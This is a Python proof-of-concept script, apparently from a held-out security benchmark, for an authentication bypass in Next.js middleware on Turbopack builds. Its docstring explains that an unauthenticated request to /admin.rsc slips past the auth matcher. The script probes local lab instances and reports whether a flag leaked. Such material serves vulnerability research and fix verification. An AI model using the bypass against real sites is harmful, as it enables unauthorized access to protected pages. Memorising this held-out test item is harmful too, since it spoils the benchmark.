#!/usr/bin/env python3
"""
Residual bypass — CVE-2026-45109 (GHSA-26hh-7cqf-hhc6). HELD OUT.

The CVE-2026-44575 fix extended the middleware `matcher` to cover the App Router
transport variants (.rsc / .segments/....segment.rsc) — but ONLY in the webpack
build pipeline. When the SAME app source is built with Turbopack
(`next build --turbopack`), the matcher regex is generated WITHOUT the transport
variants, so the exact same unauthenticated /admin.rsc request bypasses the auth
gate again and the protected page (with ${PCB_FLAG}) leaks. Fixed in 15.5.18,
which applies the transport-variant matcher to the Turbopack pipeline as well.

Same request as the original PoC — the differentiator is the BUILD MODE, not the
payload (this is the incomplete-fix: identical class, uncovered pipeline).

Profiles (default ports):
  v1_turbo 15.5.16 turbopack  http://127.0.0.1:41092  -> REACHES  (residual; matcher lacks .rsc under Turbopack)
  v2_turbo 15.5.18 turbopack  http://127.0.0.1:41093  -> BLOCKED  (CVE-2026-45109 fix; matcher covers .rsc under Turbopack)

Usage: bypass_poc.py [base_url] [flag]
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from oracle import probe

DEFAULT = "http://127.0.0.1:41092"

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT
    flag = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("PCB_FLAG", "")
    r = probe(base, flag)
    print("control  GET /admin        ->", r["control"]["status"],
          "(enforced_401=%s)" % r["control"]["enforced_401"])
    print("bypass   GET %-16s ->" % r["bypass"]["path"], r["bypass"]["status"],
          "flag_leaked=%s" % r["bypass"]["flag_leaked"])
    print("RESULT:", "RESIDUAL-BYPASS-REACHES-FLAG" if r["flag_leaked"] else "BLOCKED")
    sys.exit(0 if r["flag_leaked"] else 1)
